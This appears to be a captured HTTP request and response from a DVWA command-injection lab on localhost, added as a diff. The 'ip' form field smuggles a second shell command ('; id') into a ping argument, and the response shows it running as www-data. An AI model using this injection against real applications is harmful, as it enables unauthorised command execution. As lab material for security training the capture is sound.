@@ -1,0 +1,15 @@
+POST /dvwa/vulnerabilities/exec/ HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=<REDACTED_LAB_SESSION>; security=low
+
+ip=127.0.0.1%3B+id&Submit=Submit
+
+=== RESPONSE ===
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+
+<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.056 ms
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
